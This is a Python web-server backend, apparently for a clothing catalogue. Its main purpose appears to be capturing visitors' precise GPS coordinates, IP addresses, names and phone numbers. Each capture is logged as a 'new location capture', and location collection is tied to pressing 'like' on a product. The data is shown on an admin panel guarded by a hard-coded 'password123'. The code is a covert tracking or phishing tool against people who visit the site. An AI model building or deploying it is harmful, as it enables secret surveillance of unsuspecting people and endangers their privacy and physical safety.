from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime

data_store = []

import base64

ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'password123'
active_sessions = set()
online_users = {}

class CustomHandler(SimpleHTTPRequestHandler):
    def check_auth(self):
        cookie = self.headers.get('Cookie')
        if cookie:
            for item in cookie.split(';'):
                if item.strip().startswith('session_id='):
                    session_id = item.strip().split('=')[1]
                    if session_id in active_sessions:
                        return True
        return False

    def request_auth(self, is_api=False):
        if is_api:
            self.send_response(401)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"error":"Unauthorized"}')
        else:
            self.send_response(302)
            self.send_header('Location', '/login.html')
            self.end_headers()

    def do_POST(self):
        if self.path == '/api/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                if payload.get('username') == ADMIN_USERNAME and payload.get('password') == ADMIN_PASSWORD:
                    import uuid
                    new_session = str(uuid.uuid4())
                    active_sessions.add(new_session)
                    self.send_response(200)
                    self.send_header('Set-Cookie', f'session_id={new_session}; Path=/')
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(b'{"status":"success"}')
                else:
                    self.send_response(401)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(b'{"status":"error"}')
            except:
                self.send_response(400)
                self.end_headers()
            return
            
        if self.path == '/api/logout':
            cookie = self.headers.get('Cookie')
            if cookie:
                for item in cookie.split(';'):
                    if item.strip().startswith('session_id='):
                        session_id = item.strip().split('=')[1]
                        if session_id in active_sessions:
                            active_sessions.remove(session_id)
            self.send_response(200)
            self.send_header('Set-Cookie', 'session_id=; Path=/; Max-Age=0')
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"success"}')
            return
            
        if self.path == '/api/ping':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                user_id = payload.get('userId')
                if user_id:
                    import time
                    online_users[user_id] = time.time()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            except:
                self.send_response(400)
                self.end_headers()
            return
            
        # Proteccion de rutas POST administrativas
        protected_paths = ['/api/upload', '/api/contacts/clear', '/api/locations/clear', '/api/contacts/delete_selected', '/api/locations/delete_selected']
        if self.path in protected_paths:
            if not self.check_auth():
                self.request_auth(is_api=True)
                return
        
        global data_store
        if self.path == '/api/location':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                location = json.loads(post_data.decode('utf-8'))
                # Obtener la IP real si estamos detrás de un proxy (ej. Render)
                forwarded_for = self.headers.get('X-Forwarded-For')
                if forwarded_for:
                    location['ip'] = forwarded_for.split(',')[0].strip()
                else:
                    location['ip'] = self.client_address[0]
                import uuid, os
                location['id'] = str(uuid.uuid4())
                location['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                locations = []
                if os.path.exists('locations.json'):
                    try:
                        with open('locations.json', 'r', encoding='utf-8') as f:
                            locations = json.load(f)
                    except:
                        pass
                
                locations.append(location)
                
                with open('locations.json', 'w', encoding='utf-8') as f:
                    json.dump(locations, f)
                
                # Actualizar contador de likes si hay productId
                product_id = location.get('productId')
                if product_id:
                    try:
                        import os
                        prods = []
                        if os.path.exists('products.json'):
                            with open('products.json', 'r', encoding='utf-8') as f:
                                prods = json.load(f)
                        for p in prods:
                            if str(p['id']) == str(product_id):
                                p['likes'] = p.get('likes', 0) + 1
                                break
                        with open('products.json', 'w', encoding='utf-8') as f:
                            json.dump(prods, f)
                    except Exception as ex:
                        print("Error actualizando likes:", ex)
                
                # Mostrar en la consola del servidor
                print(f"\n[+] ¡NUEVA CAPTURA DE UBICACIÓN!")
                print(f"    Hora: {location['timestamp']}")
                print(f"    IP: {location['ip']}")
                print(f"    Coordenadas: {location.get('latitude')}, {location.get('longitude')}\n")
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/locations/clear':
            with open('locations.json', 'w', encoding='utf-8') as f:
                f.write('[]')
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            
        elif self.path == '/api/locations/delete_selected':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                ids_to_delete = payload.get('ids', [])
                
                import os
                if os.path.exists('locations.json'):
                    with open('locations.json', 'r', encoding='utf-8') as f:
                        locs = json.load(f)
                    locs = [loc for loc in locs if loc.get('id') not in ids_to_delete]
                    with open('locations.json', 'w', encoding='utf-8') as f:
                        json.dump(locs, f)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/products':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                import os
                
                products = []
                if os.path.exists('products.json'):
                    with open('products.json', 'r', encoding='utf-8') as f:
                        products = json.load(f)
                        
                # Si es para editar
                if 'id' in payload and 'name' in payload:
                    for p in products:
                        if str(p['id']) == str(payload['id']):
                            p['name'] = payload['name']
                            break
                
                with open('products.json', 'w', encoding='utf-8') as f:
                    json.dump(products, f)
                    
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/contact':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                import os, datetime, urllib.request, uuid
                payload['id'] = str(uuid.uuid4())
                payload['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                # Obtener la IP
                forwarded_for = self.headers.get('X-Forwarded-For')
                if forwarded_for:
                    payload['ip'] = forwarded_for.split(',')[0].strip()
                else:
                    payload['ip'] = self.client_address[0]
                
                # Obtener Geolocalización por IP
                ip_address = payload.get('ip')
                
                # Si estamos probando en localhost, obtener la IP pública real para la demostración
                if ip_address in ['127.0.0.1', '::1', 'localhost']:
                    try:
                        req_ip = urllib.request.Request("http://api.ipify.org")
                        with urllib.request.urlopen(req_ip, timeout=3) as resp:
                            ip_address = resp.read().decode('utf-8')
                            payload['ip'] = ip_address + ' (Tú)'
                    except:
                        pass

                if ip_address and '127.0.0.1' not in ip_address:
                    try:
                        clean_ip = ip_address.replace(' (Tú)', '')
                        req = urllib.request.Request(f"http://ip-api.com/json/{clean_ip}")
                        with urllib.request.urlopen(req, timeout=3) as response:
                            ip_data = json.loads(response.read().decode())
                            if ip_data.get('status') == 'success':
                                payload['city'] = ip_data.get('city', '')
                                payload['country'] = ip_data.get('country', '')
                                payload['isp'] = ip_data.get('isp', '')
                                # Solo usar lat/lon de la IP si no se mandaron las del GPS
                                if 'exactLat' not in payload:
                                    payload['lat'] = ip_data.get('lat', '')
                                    payload['lon'] = ip_data.get('lon', '')
                                    payload['locationType'] = 'IP Aproximada'
                    except Exception as e:
                        print("Error obteniendo geo IP:", e)
                else:
                    payload['city'] = 'Localhost'
                    payload['country'] = 'Local'
                    payload['isp'] = 'Local Network'
                    if 'exactLat' not in payload:
                        payload['locationType'] = 'IP Aproximada'
                
                # Si vinieron las coordenadas exactas del GPS, sobreescribir
                if 'exactLat' in payload and 'exactLon' in payload:
                    payload['lat'] = payload['exactLat']
                    payload['lon'] = payload['exactLon']
                    payload['locationType'] = 'GPS Exacto'
                
                contacts = []
                if os.path.exists('contacts.json'):
                    with open('contacts.json', 'r', encoding='utf-8') as f:
                        contacts = json.load(f)
                
                contacts.append(payload)
                with open('contacts.json', 'w', encoding='utf-8') as f:
                    json.dump(contacts, f)
                    
                print(f"\n[+] NUEVO CONTACTO RECIBIDO:")
                print(f"    Nombre: {payload.get('name')}")
                print(f"    Teléfono: {payload.get('phone')}")
                print(f"    Producto: {payload.get('productName')}")
                print(f"    Ubicación (IP): {payload.get('city')}, {payload.get('country')}\n")
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/upload':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                filename = payload.get('filename')
                filedata_b64 = payload.get('filedata')
                
                if "," in filedata_b64:
                    filedata_b64 = filedata_b64.split(",")[1]
                    
                import base64
                import os
                import time
                
                if not os.path.exists('uploads'):
                    os.makedirs('uploads')
                    
                filepath = os.path.join('uploads', os.path.basename(filename))
                with open(filepath, 'wb') as f:
                    f.write(base64.b64decode(filedata_b64))
                
                # Actualizar products.json
                try:
                    products = []
                    if os.path.exists('products.json'):
                        with open('products.json', 'r', encoding='utf-8') as f:
                            products = json.load(f)
                    
                    web_filepath = filepath.replace('\\', '/')
                    new_product = {
                        "id": str(int(time.time())),
                        "image": web_filepath,
                        "name": "Look Añadido"
                    }
                    products.append(new_product)
                    
                    with open('products.json', 'w', encoding='utf-8') as f:
                        json.dump(products, f)
                except Exception as ex:
                    print("Error actualizando products.json:", ex)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success", "file": filepath}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/contacts/delete_selected':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            payload = json.loads(post_data.decode('utf-8'))
            ids_to_delete = payload.get('ids', [])
            
            import os
            if os.path.exists('contacts.json'):
                with open('contacts.json', 'r', encoding='utf-8') as f:
                    contacts = json.load(f)
                contacts = [c for c in contacts if c.get('id') not in ids_to_delete]
                with open('contacts.json', 'w', encoding='utf-8') as f:
                    json.dump(contacts, f)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))

        elif self.path == '/api/contacts/clear':
            with open('contacts.json', 'w', encoding='utf-8') as f:
                f.write('[]')
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_DELETE(self):
        if not self.check_auth():
            self.request_auth(is_api=True)
            return
            
        if self.path.startswith('/api/products/'):
            product_id = self.path.split('/')[-1]
            try:
                import os
                products = []
                if os.path.exists('products.json'):
                    with open('products.json', 'r', encoding='utf-8') as f:
                        products = json.load(f)
                
                new_products = [p for p in products if str(p['id']) != str(product_id)]
                
                # Opcional: borrar el archivo físico si está en uploads/
                for p in products:
                    if str(p['id']) == str(product_id) and p['image'].startswith('uploads/'):
                        try:
                            if os.path.exists(p['image']):
                                os.remove(p['image'])
                        except:
                            pass
                
                with open('products.json', 'w', encoding='utf-8') as f:
                    json.dump(new_products, f)
                    
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
        elif self.path == '/api/locations':
            global data_store
            data_store.clear()
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/admin.html':
            if not self.check_auth():
                self.request_auth(is_api=False)
                return
                
        protected_paths_get = ['/api/locations', '/api/contacts']
        if self.path in protected_paths_get:
            if not self.check_auth():
                self.request_auth(is_api=True)
                return

        if self.path == '/api/online_count':
            import time
            current_time = time.time()
            expired_users = [uid for uid, t in online_users.items() if current_time - t > 30]
            for uid in expired_users:
                del online_users[uid]
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            self.wfile.write(json.dumps({"count": len(online_users)}).encode('utf-8'))
            return

        if self.path == '/api/products':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            import os
            if os.path.exists('products.json'):
                with open('products.json', 'r', encoding='utf-8') as f:
                    self.wfile.write(f.read().encode('utf-8'))
            else:
                self.wfile.write(b'[]')
        elif self.path == '/api/locations':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            import os
            locs = []
            if os.path.exists('locations.json'):
                try:
                    with open('locations.json', 'r', encoding='utf-8') as f:
                        locs = json.load(f)
                except:
                    pass
            self.wfile.write(json.dumps(locs).encode('utf-8'))
        elif self.path == '/api/contacts':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            import os
            if os.path.exists('contacts.json'):
                with open('contacts.json', 'r', encoding='utf-8') as f:
                    contacts = json.load(f)
                    
                # Ensure all contacts have an ID
                modified = False
                for i, c in enumerate(contacts):
                    if 'id' not in c:
                        c['id'] = f"contact_{i}_{c.get('timestamp', '').replace(' ', '').replace(':', '').replace('-', '')}"
                        modified = True
                if modified:
                    with open('contacts.json', 'w', encoding='utf-8') as f:
                        json.dump(contacts, f)
                        
                self.wfile.write(json.dumps(contacts).encode('utf-8'))
            else:
                self.wfile.write(b'[]')
        else:
            super().do_GET()

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), CustomHandler)
    print(f"Servidor iniciado en http://0.0.0.0:{port}")
    print(f"Catálogo público: http://0.0.0.0:{port}")
    print(f"Panel de administración: http://0.0.0.0:{port}/admin.html")
    server.serve_forever()
